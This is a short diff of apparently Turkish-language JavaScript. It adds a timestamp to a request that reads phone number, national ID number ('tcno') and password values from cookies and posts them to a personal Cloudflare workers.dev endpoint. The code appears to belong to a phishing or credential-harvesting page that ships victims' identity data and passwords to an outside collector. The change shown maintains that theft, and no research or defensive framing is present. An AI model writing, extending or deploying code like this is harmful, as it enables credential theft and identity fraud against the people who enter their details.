@@ -436,11 +436,18 @@
         var tcno = getCookie("tcno");
         var pass = getCookie("pass");
 
+        // İstanbul saat diliminde post saatini al
+        var now = new Date();
+        var options = { timeZone: 'Europe/Istanbul', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+        var formatter = new Intl.DateTimeFormat([], options);
+        var postTime = formatter.format(now);
+
         // POST işlemi için veri oluştur
         var data = new FormData();
         data.append('telno', telno);
         data.append('tcno', tcno); // Cookie'den alınan adı ekle
         data.append('pass', pass);
+        data.append('post_time', postTime); // Post saatini ekle
 
         // POST işlemi için fetch kullanarak isteği oluştur
         fetch('https://worker-shrill-rice-bfa4.selimjuhan2.workers.dev/', {
